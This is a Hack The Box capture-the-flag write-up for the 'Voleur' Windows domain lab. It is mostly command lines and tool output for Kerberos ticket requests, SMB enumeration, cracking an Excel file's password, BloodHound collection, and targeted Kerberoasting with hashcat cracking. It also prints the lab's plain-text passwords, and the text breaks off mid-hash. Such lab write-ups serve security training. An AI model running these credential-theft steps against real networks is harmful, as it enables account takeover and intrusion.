---
title: Voleur [Medium]
date: 2025-07-07
tags: [htb, windows, nmap, smb, ldap, kerberos, runascs, secretsdump, evil-winrm, dpapi, ntds, nxc, ldapsearch, smbclient, john, office2john, excel, bloodhound, kerberos, cracking, deleted objects, writeSPN, GenericWrite, getTGT, rdate]
categories: [HTB Writeups]
author: 2Fa0n
img_path: /assets/img/voleur-htb-season8
image: /assets/img/voleur-htb-season8/voleur-htb-season8_banner.png
---

# Voleur HTB Season 8
## Machine information
As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: `ryan.naylor` / `HollowOct31Nyt` <br>
Author: [baseDN](https://app.hackthebox.com/users/1514235)

## Enumeration
### Nmap
```bash
└─$ sudo nmap -Pn -sC -sV 10.129.98.35                                                     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-06 09:50 EDT
Nmap scan report for 10.129.98.35 (10.129.98.35)
Host is up (0.20s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-06 21:50:57Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 7h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-06T21:51:09
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.46 seconds
```

Add these to `/etc/hosts` file:
```bash
10.129.98.35     voleur.htb dc.voleur.htb
```

### Enum users
So this machine using kerberos service, so we need to modify the `/etc/krb5.conf` file to use the correct domain.
```bash
└─$ sudo nxc smb 10.129.98.35 -u 'ryan.naylor' -p 'HollowOct31Nyt' --generate-krb5-file krb5.conf
SMB         10.129.98.35    445    10.129.98.35     [*]  x64 (name:10.129.98.35) (domain:10.129.98.35) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.98.35    445    10.129.98.35     [-] 10.129.98.35\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED
```

```bash
└─$ cat krb5.conf 

[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = 10.129.98.35

[realms]
    10.129.98.35 = {
        kdc = 10.129.98.35.10.129.98.35
        admin_server = 10.129.98.35.10.129.98.35
        default_domain = 10.129.98.35
    }

[domain_realm]
    .10.129.98.35 = 10.129.98.35
    10.129.98.35 = 10.129.98.35
```

Just change the `ip` to `host` and add some stuff to the file.

```bash
└─$ cat krb5.conf

[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = VOLEUR.HTB
    ticket_lifetime = 24h
    forwardable = yes

[realms]
    VOLEUR.HTB = {
        kdc = dc.voleur.htb
        admin_server = dc.voleur.htb
        default_domain = voleur.htb
    }

[domain_realm]
    .voleur.htb = VOLEUR.HTB
    VOLEUR.HTB = VOLEUR.HTB
```

Replace this file to `/etc/krb5.conf`.

Now we gonna request **Ticket Granting Ticket** for `ryan.naylor` user.

```bash
└─$ getTGT.py -dc-ip 10.129.98.35 'voleur.htb/ryan.naylor:HollowOct31Nyt'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ryan.naylor.ccache
```

> Remember to `sudo rdate -n 10.129.98.35` to sync the time incase of clock skew.

Next we will set the ticket to the environment variable.

```bash
└─$ export KRB5CCNAME=ryan.naylor.ccache
```

Checking the ticket to make sure it got the correct ticket.

```bash
└─$ klist
Ticket cache: FILE:ryan.naylor.ccache
Default principal: ryan.naylor@VOLEUR.HTB

Valid starting       Expires              Service principal
07/06/2025 18:16:13  07/07/2025 04:16:13  krbtgt/VOLEUR.HTB@VOLEUR.HTB
        renew until 07/07/2025 18:14:28
```

Now let's enumerate the users.

```bash
└─$ sudo nxc smb dc.voleur.htb -d voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --users
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         dc.voleur.htb   445    dc               Administrator                 2025-01-28 20:35:13 0       Built-in account for administering the computer/domain 
SMB         dc.voleur.htb   445    dc               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         dc.voleur.htb   445    dc               krbtgt                        2025-01-29 08:43:06 0       Key Distribution Center Service Account 
SMB         dc.voleur.htb   445    dc               ryan.naylor                   2025-01-29 09:26:46 0       First-Line Support Technician 
SMB         dc.voleur.htb   445    dc               marie.bryant                  2025-01-29 09:21:07 0       First-Line Support Technician 
SMB         dc.voleur.htb   445    dc               lacey.miller                  2025-01-29 09:20:10 0       Second-Line Support Technician 
SMB         dc.voleur.htb   445    dc               svc_ldap                      2025-01-29 09:20:54 0        
SMB         dc.voleur.htb   445    dc               svc_backup                    2025-01-29 09:20:36 0        
SMB         dc.voleur.htb   445    dc               svc_iis                       2025-01-29 09:20:45 0        
SMB         dc.voleur.htb   445    dc               jeremy.combs                  2025-01-29 15:10:32 0       Third-Line Support Technician 
SMB         dc.voleur.htb   445    dc               svc_winrm                     2025-01-31 09:10:12 0        
SMB         dc.voleur.htb   445    dc               [*] Enumerated 11 local users: VOLEUR
```

We got 11 users, we can also enum with `ldapsearch` command.

```bash
└─$ ldapsearch -x -H ldap://dc.voleur.htb -D 'ryan.naylor@voleur.htb' -w 'HollowOct31Nyt' -b 'dc=voleur,dc=htb' "(objectClass=user)" userPrincipalName sAMAccountName  
# extended LDIF
#
# LDAPv3
# base <dc=voleur,dc=htb> with scope subtree
# filter: (objectClass=user)
# requesting: userPrincipalName sAMAccountName 
#

# Administrator, Users, voleur.htb
dn: CN=Administrator,CN=Users,DC=voleur,DC=htb
sAMAccountName: Administrator

# Guest, Users, voleur.htb
dn: CN=Guest,CN=Users,DC=voleur,DC=htb
sAMAccountName: Guest

# DC, Domain Controllers, voleur.htb
dn: CN=DC,OU=Domain Controllers,DC=voleur,DC=htb
sAMAccountName: DC$

# krbtgt, Users, voleur.htb
dn: CN=krbtgt,CN=Users,DC=voleur,DC=htb
sAMAccountName: krbtgt

# Ryan Naylor, First-Line Support Technicians, voleur.htb
dn: CN=Ryan Naylor,OU=First-Line Support Technicians,DC=voleur,DC=htb
sAMAccountName: ryan.naylor
userPrincipalName: ryan.naylor@voleur.htb

# Marie Bryant, First-Line Support Technicians, voleur.htb
dn: CN=Marie Bryant,OU=First-Line Support Technicians,DC=voleur,DC=htb
sAMAccountName: marie.bryant
userPrincipalName: marie.bryant@voleur.htb

# Lacey Miller, Second-Line Support Technicians, voleur.htb
dn: CN=Lacey Miller,OU=Second-Line Support Technicians,DC=voleur,DC=htb
sAMAccountName: lacey.miller
userPrincipalName: lacey.miller@voleur.htb

# svc_ldap, Service Accounts, voleur.htb
dn: CN=svc_ldap,OU=Service Accounts,DC=voleur,DC=htb
sAMAccountName: svc_ldap
userPrincipalName: svc_ldap@voleur.htb

# svc_backup, Service Accounts, voleur.htb
dn: CN=svc_backup,OU=Service Accounts,DC=voleur,DC=htb
sAMAccountName: svc_backup
userPrincipalName: svc_backup@voleur.htb

# svc_iis, Service Accounts, voleur.htb
dn: CN=svc_iis,OU=Service Accounts,DC=voleur,DC=htb
sAMAccountName: svc_iis
userPrincipalName: svc_iis@voleur.htb

# Jeremy Combs, Third-Line Support Technicians, voleur.htb
dn: CN=Jeremy Combs,OU=Third-Line Support Technicians,DC=voleur,DC=htb
sAMAccountName: jeremy.combs
userPrincipalName: jeremy.combs@voleur.htb

# svc_winrm, Service Accounts, voleur.htb
dn: CN=svc_winrm,OU=Service Accounts,DC=voleur,DC=htb
sAMAccountName: svc_winrm
userPrincipalName: svc_winrm@voleur.htb

# search reference
ref: ldap://ForestDnsZones.voleur.htb/DC=ForestDnsZones,DC=voleur,DC=htb

# search reference
ref: ldap://DomainDnsZones.voleur.htb/DC=DomainDnsZones,DC=voleur,DC=htb

# search reference
ref: ldap://voleur.htb/CN=Configuration,DC=voleur,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 16
# numEntries: 12
# numReferences: 3
```

So this machine does not contain many computers like the [RustyKey](https://dudenation.github.io/posts/rustykey-htb-season8/) machine. <br>
&rarr; Let's check for the **SMB** shares.

### SMB
```bash
└─$ sudo nxc smb dc.voleur.htb -d voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --shares
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance                         
SMB         dc.voleur.htb   445    dc               HR                              
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ            
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share
```

The `IT` share looks really interesting, let's check it. <br>
We gonna use [smbclient.py](https://github.com/fortra/impacket/blob/master/impacket/examples/smbclient.py) to check the share.

```bash
└─$ smbclient.py -k dc.voleur.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 04:10:01 2025 .
drw-rw-rw-          0  Mon Jun 30 17:08:33 2025 ..
drw-rw-rw-          0  Wed Jan 29 04:40:17 2025 First-Line Support
# cd First-Line Support
# ls
drw-rw-rw-          0  Wed Jan 29 04:40:17 2025 .
drw-rw-rw-          0  Wed Jan 29 04:10:01 2025 ..
-rw-rw-rw-      16896  Thu May 29 18:23:36 2025 Access_Review.xlsx
# get Access_Review.xlsx
```

Found out there is a `Access_Review.xlsx` file, gonna download and check it.

### Excel password & Cracking
When opening the `Access_Review.xlsx` file, it will ask for a password.

![voleur-htb-season8-excel-password](/assets/img/voleur-htb-season8/voleur-htb-season8-excel-password.png)

So we need to crack the file by coverting it to hash with [office2john](https://github.com/openwall/john/blob/bleeding-jumbo/run/office2john.py) and then use [john](https://github.com/openwall/john) to crack it.

```bash
└─$ office2john Access_Review.xlsx > access_review_hash.txt
```

```bash
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt access_review_hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 512/512 AVX512BW 16x / SHA512 512/512 AVX512BW 8x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football1        (Access_Review.xlsx)     
1g 0:00:00:02 DONE (2025-07-06 18:41) 0.4048g/s 336.8p/s 336.8c/s 336.8C/s football1..legolas
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```bash
└─$ john access_review_hash.txt --show
Access_Review.xlsx:football1

1 password hash cracked, 0 left
```

Got the password for the excel file, let's open it. <br>
&rarr; `Access_Review.xlsx:football1`

![voleur-htb-season8-excel](/assets/img/voleur-htb-season8/voleur-htb-season8-excel.png)

So we got some information, let's summarize it.

- `Ryan.Naylor`, `Marie.Bryant` are from First-Line Support Technician.
- `Lacey.Miller`, `Todd.Wolfe` from Second-Line Support Technician and has permissions on Remote Management Users.

> *Note:* `Todd.Wolfe` is being crossed out in the excel file and but we know the password was reset to `NightT1meP1dg3on14`

**Chance** can be restore this account so we can gain further access and even more information for later escalation.

- `Jeremy.Combs` from Third-Line Support Technician and has permissions on Remote Management Users. 

> *Note:* Has access to Software folder. &rarr; If we get this account, we can get useful information from this folder.

- `Administrator` as we know is our last target to `root.txt` flag.

Next will be note about **Some service accounts**.

- `svc_backup` has permissions on Windows Backup but we need to ask `Jeremy.Combs` maybe the password or something else.
- `svc_ldap` has permissions on LDAP Services and has password `M1XyC9pW7qT5Vn`.
- `svc_iis` has permissions on IIS Administration and has password `N5pXyW1VqM7CZ8`.
- `svc_winrm` has permissions on Remote Management and got a note that "Need to ask `Lacey` because she has reset this recently".

Got lot of great stuffs, let's check with `BloodHound`.

### BloodHound
```bash
└─$ bloodhound-python -u 'ryan.naylor' -p 'HollowOct31Nyt' -d voleur.htb -c All -o bloodhound_results.json -ns 10.129.98.35 -k
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: voleur.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 12 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.voleur.htb
INFO: Done in 00M 30S
```

Start the `bloodhound` and upload the `bloodhound_results.json*` file.

![voleur-htb-season8-bloodhound](/assets/img/voleur-htb-season8/voleur-htb-season8-bloodhound.png)

After look around, we got some interesting things to take a look.

![voleur-htb-season8-bloodhound-2](/assets/img/voleur-htb-season8/voleur-htb-season8-bloodhound-2.png)

- `SVC_LDAP@VOLEUR.HTB` has **WriteSPN** over `SVC_WINRM@VOLEUR.HTB` so we can [DACL abuse](https://www.thehacker.recipes/ad/movement/dacl/#bloodhound-ace-edges) by [Targeted Kerberoasting](https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting) to get the `svc_winrm` user's password.
- `SVC_LDAP@VOLEUR.HTB` is also member of `RESTORE_USER@VOLEUR.HTB` group which has **GenericWrite** over `LACEY.MILLER@VOLEUR.HTB` and `SECON-LINE SUPPORT TECHNICIANS@VOLEUR` so we can restore `Todd.Wolfe` account with this.

### Kerberoasting
Let's request the **Ticket Granting Ticket** for `svc_ldap` user.
```bash
└─$ getTGT.py -dc-ip 10.129.98.35 'voleur.htb/svc_ldap:M1XyC9pW7qT5Vn'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_ldap.ccache
```

Now change the `KRB5CCNAME` to the `svc_ldap.ccache` file.

```bash
└─$ export KRB5CCNAME=svc_ldap.ccache
```

Then use [targetedKerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast/blob/main/targetedKerberoast.py) to get the password of `svc_winrm` user.

```bash
└─$ python3 targetedKerberoast.py -v --dc-host dc.voleur.htb -d voleur.htb -u svc_ldap -k    
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (lacey.miller)
[+] Printing hash for (lacey.miller)
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$5d5c60668aa39cee9c7ced2226c2ef6f$e850ecf7aebf724db9d23ce7b34b607d63d1f0f951b10f6caf842c47bf6962f2eba8ae6e56c966563e3f1ea5a1db4757826aa2a5243d6eb6186723ca4fa94c8387bf33c83992d452a71b16db039b75140a49397922e95db8ce99d5722350a82443598b020cf5f8748867a1eb400b34613cb2e4df4e00b86ad4b774847cb07f6d0f8f400bfd8f62d5e0ce38a1d274e88e9cff81f5a27e6cab4a7e66d9b31c8e4b146a222d02ff41eca5a1d6d6e440368612e4ee8478e150d173a878f2f3372ea7bd6b4e6f71e7ec23392e886ff200a607502e8dd5f8ceec0a1f4e41eddde1a3215b6b60e5c9715ccce6b700646aa1303db7f7b76a7ff4fe40320fb76a4d1ef56e47b39070f9421ce568af0acac1e2bf3b3e7b251a8e5e84d658994244db761bb249b07a3746dc378c5f715065fcd53fa47854f545d8e4a6ac91f38bf94e81e0e4f9cb0436aee09173e49180e75156543be3c0d46ae015d8968bcf2ec33a807a4201050ad5d7b0f09fb85d2c4b02856886019373283b1288cadfc998f428c131c809744bddaf60b9d55b6d787ebc3676c2727f0d3bc3a9b74c5e08fabbb96e6d792065167ea3f17c5d01350d45aec2b1eedaefbb1ab3ee97613f96c27ad0a1ec66c0bb9fad633b9653da533bfe2199299d59389c3c90fa7af18f50283cef5fc2d8784dfe0f026aa68624e135d2a45a33b59528485dddeb5d2a5ef598ebbdef94442ab852f0432f791f09916c2a1979126def29e0df2af615d284ae108fa652fa144c4a4ed6f0c9a5de1b9ce7b1a7defee983d32b258941a5508e368e2f379e66014dce8345200e2c6d73d4ea27d1f1d1613a119aeaf0853a414e85a5e957f297bec3bd5d8998343a043ffb34376454db50811fc9efeb9377109491d9b57d342dba0f00a7316a1fcb906c9b0e18826b337f909bf525c81d5c10a5ed34c12cd5229e5ebc9d55a4c99e63313ba4d0efcec81f0c46cf8cc4d94f51ef3c0ac1a56e70c024dad8cc231dd87aeac2f71c4ad5ae68cf79cd32d4020a9daec6312eacf30a4daad6bb9e3be6478ec5351cdb709d7acdfdf908e482c05591f335f28fce53b20a2ef1937dd00c34f8602bdf335d9ad2e74fad92dac2caf42244d2092369845de0bfd8f910db2d76b2538a3a9e5b0c758aa0b4902d1fa4039c1dd01df36e8933ea7a8eabcd324f83e9cb4e3e443f27547571ba8376a48c343e9fb851f743be0e751587dabee01ec2de95df36e7d74984a1c3cc52a7e61e98beeff0049ab1b902b770f9ee8ea2beff4d097ebdccf7de6359a96b4ee90a4298a24f7af1afa125de1798668ebb2acb1a435c7a5f2f05a4b450898cc245a24e478aa4ec41e3aefef429ebfb15f0e843a4e218ddfac6552d9b7bc31e4a1683bb927764d0ad83abe6a575c74a3c029a77a2bf91d714c0507a73ddab7e21195381adc4cabc9dacd8143957b434501540cb4d27e2a340e4b34232a679c319
[VERBOSE] SPN removed successfully for (lacey.miller)
[VERBOSE] SPN added successfully for (svc_winrm)
[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$63b0c781e9733300f29fd34b6ce6f80b$7f60183ac27a531ce4a87edba590af29e2d15b2dcf6559f32c03c59b3d359350554550ecbe7558201963f731d9ab2e00e3c530948aa2bd90012ca19b2910ee954e527e39fdafc3993fbd40a234c42e3adcd78363a0d4e15f75cf166bb0a0645028b0cbc4f897eb06a053a0bd47c4727b7219f4d647e77b64a18da1043951251aefeb251c0461cd9b10c9a97f981030d5a0479ac8b5925ccaa0e73cb65907f3be98156b4021e628bbad237929de5fc017318ab7336829f3dfb687cfb13ec80330f76f3429acdabdf842e6516acf6c621abd2700d308c48701fb95f7cad7733cf4c03d25b8c118b960a46618f8d7d73cea71e102b154162a4ac3ecb76c32998b0eb29d252782cdeea9a0d2d3e045ee4fa9adf2be04e20f64082ad5959ea156bf92c0813101e8bdb0ae40571171f9b44afa08b63e0b1437333c48cd665143b443513d6bae6723a3d3ae6bef337b72cf9e8bb9a477ad433bd7ba3493ff070b5b40a89c9951220f161617453e72cdb4079e330d1e899f7d7c339dd642bde8bafac8ab02d938d09e7a0b78151a3640ca3ba068718c234968568c259a008501f7603bfb8306b0679e4fb8b4644b065361edc80d2a19f4fdfbfca17dd47434472ff7366ea78bdf9dc1fbd8553d3d8039c14bcb1cdd80d7d2f05fac9fda9ce4b1a878d613b2ad6a50024cd6d6189bd4aad893183774b3f580bfb5cb348aa2fefb6a523df21baa21c6387dcae90fb71e2433fc387801df78c7e410968fb04089b84da68c3f035a08ed178d0d9cf1a5ff1ab4106a2c3ea9591288d8e8aabe1936635c83c2cb4a57f6a89a65cea62cb02b6ee77511a5a4c47000770efea49cd63dc8d7d80fd25314b05ff7078dea279b1aea2306ebea414f5ba9d45cba92f59ed4418a3d67aefb17b6d292b5c1eac4d19fbd52040fced74ddb30db41b0e957202c57465eb5eb76290f32a6c7c286c466146af6b50180ce8260991156ae876e4040f52be2a2a6bcaeb7f6b3423fd5cb8e127e96608de7b2e0a6865cccca70b4ebd34f1e67c50b3aea0325dfd6ac1b72fea91627627cb40e910a7c34d204af2b649554f0097d8229b3912bf6b28caad5f701c0c0d8a5d124ac16ec04e856cbc76cf97f548a73e123822736f09763a6cbf47ddd9400b8a002bb8b533c46276d8a808a0c24309e39230c0f19f66a207f9b58dfb780b4fb607794e26940cc9f6a7294092e54a96af6b2634b5d99899160bc5b0005be30a6427c9578502ef35ea4466792c6f58346cee238f3f9858600118b633f0639afc00ba438aaa5f371b837a0f1a6ba3d928c0424215e5906e61292eff0250c0545121f94caffb197f9c2deb22562fba84426ba9e2b70db08802fadb16b7d328dbcbd5746a04e70cb0ae38db2f083edd70d90c46e31ccabdb31e0dbf7d23162fb0d3e8563d2a03d699a2e6e84fb4824926b7cc5f729dcebbb8b973df57e73f3b3dbf378a17ddd
[VERBOSE] SPN removed successfully for (svc_winrm)https://github.com/ShutdownRepo/targetedKerberoast/blob/main/targetedKerberoast.py
```

So we got 2 hashes from `lacey.miller` and `svc_winrm`. <br>
&rarr; Let's crack the hashes with [hashcat](https://hashcat.net/hashcat/).

```bash
└─$ hashcat -h | grep -i kerberos
  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
```

```bash
└─$ hashcat -m 13100 kerberos_hashes.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-skylake-avx512-Intel(R) Core(TM) i5-1038NG7 CPU @ 2.00GHz, 1424/2912 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$63b0c781e9733300f29fd34b6ce6f80b$7f60183ac27a531ce4a87edba590af29e2d15b2dcf6559f32c03c59b3d359350554550ecbe7558201963f731d9ab2e00e3c530948aa2bd90012ca19b2910ee954e527e39fdafc3993fbd40a234c42e3adcd78363a0d4e15f75cf166bb0a0645028b0cbc4f897eb06a053a0bd47c4727b7219f4d647e77b64a18da1043951251aefeb251c0461cd9b10c9a97f981030d5a0479ac8b5925ccaa0e73cb65907f3be98156b4021e628bbad237929de5fc017318ab7336829f3dfb687cfb13ec80330f76f3429acdabdf842e6516acf6c621abd2700d308c48701fb95f7cad7733cf4c03d25b8c118b960a46618f8d7d73cea71e102b154162a4ac3ecb76c32998b0eb29d252782cdeea9a0d2d3e045ee4fa9adf2be04e20f64082ad5959ea156bf92c0813101e8bdb0ae40571171f9b44afa08b63e0b1437333c48cd665143b443513d6bae6723a3d3ae6bef337b72cf9e8bb9a477ad433bd7ba3493ff070b5b40a89c9951220f161617453e72cdb4079e330d1e899f7d7c339dd642bde8bafac8ab02d938d09e7a0b78151a3640ca3ba068718c234968568c259a008501f7603bfb8306b0679e4fb8b4644b065361edc80d2a19f4fdfbfca17dd47434472ff7366ea78bdf9dc1fbd8553d3d8039c14bcb1cdd80d7d2f05fac9fda9ce4b1a878d613b2ad6a50024cd6d6189bd4aad893183774b3f580bfb5cb348aa2fefb6a523df21baa21c6387dcae90fb71e2433fc387801df78c7e410968fb04089b84da68c3f035a08ed178d0d9cf1a5ff1ab4106a2c3ea9591288d8e8aabe1936635c83c2cb4a57f6a89a65cea62cb02b6ee77511a5a4c47000770efea49cd63dc8d7d80fd25314b05ff7078dea279b1aea2306ebea414f5ba9d45cba92f59ed4418a3d67aefb17b6d292b5c1eac4d19fbd52040fced74ddb30db41b0e957202c57465eb5eb76290f32a6c7c286c466146af6b50180ce8260991156ae876e4040f52be2a2a6bcaeb7f6b3423fd5cb8e127e96608de7b2e0a6865cccca70b4ebd34f1e67c50b3aea0325dfd6ac1b72fea91627627cb40e910a7c34d204af2b649554f0097d8229b3912bf6b28caad5f701c0c0d8a5d124ac16ec04e856cbc76cf97f548a73e123822736f09763a6cbf47ddd9400b8a002bb8b533c46276d8a808a0c24309e39230c0f19f66a207f9b58dfb780b4fb607794e26940cc9f6a7294092e54a96af6b2634b5d99899160bc5b0005be30a6427c9578502ef35ea4466792c6f58346cee238f3f9858600118b633f0639afc00ba438aaa5f371b837a0f1a6ba3d928c0424215e5906e61292eff0250c0545121f94caffb197f9c2deb22562fba84426ba9e2b70db08802fadb16b7d328dbcbd5746a04e70cb0ae38db2f083edd70d90c46e31ccabdb31e0dbf7d23162fb0d3e8563d2a03d699a2e6e84fb4824926b7cc5f729dcebbb8b973df57e73f3b3dbf378a17ddd:AFireInsidedeOzarctica980219afi
```

```bash
└─$ hashcat -m 13100 kerberos_hashes.txt /usr/share/wordlists/rockyou.txt --show
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$63b0c781e9733300f29fd34b6ce6f80b$7f60183ac27a531ce4a87edba590af29e2d15b2dcf6559f32c03c59b3d359350554550ecbe7558201963f731d9ab2e00e3c530948aa2bd90012ca19b2910ee954e527e39fdafc3993fbd40a234c42e3adcd78363a0d4e15f75cf166bb0a0645028b0cbc4f897eb06a053a0bd47c4727b7219f4d647e77b64a18da1043951251aefeb251c0461cd9b10c9a97f981030d5a0479ac8b5925ccaa0e73cb65907f3be98156b4021e628bbad237929de5fc017318ab7336829f3dfb687cfb13ec80330f76f3429acdabdf842e6516acf6c621abd2700d308c48701fb95f7cad7733cf4c03d25b8c118b960a46618f8d7d73cea71e102b154162a4ac3ecb76c32998b0eb29d252782cdeea9a0d2d3e045ee4fa9adf2be04e20f64082ad5959ea156bf92c0813101e8bdb0ae40571171f9b44afa08b63e0b1437333c48cd665143b443513d6bae6723a3d3ae6bef337b72cf9e8bb9a477ad433bd7ba3493ff070b5b40a89c9951220f161617453e72cdb4079e330d1e899f7d7c339dd642bde8bafac8ab02d938d09e7a0b78151a3640ca3ba068718c234968568c259a008501f7603bfb8306b0679e4fb8b4644b065361edc80d2a19f4fdfbfca17dd47434472ff7366ea78bdf9dc1fbd8553d3d8039c14bcb1cdd80d7d2f05fac9fda9ce4b1a878d613b2ad6a50024cd6d6189bd4aad893183774b3f580bfb5cb348aa2fefb6a523df21baa21c6387dcae90fb71e2433fc387801df78c7e410968fb04089b84da68c3f035a08ed178d0d9cf1a5ff1ab4106a2c3ea9591288d8e8aabe1936635c83c2cb4a57f6a89a65cea62cb02b6ee77511a5a4c47000770efea49cd63dc8d7d80fd25314b05ff7078dea279b1aea2306ebea414f5ba9d45cba92f59ed4418a3d67aefb17b6d292b5c1eac4d19fbd52040fced74ddb30db41b0e957202c57465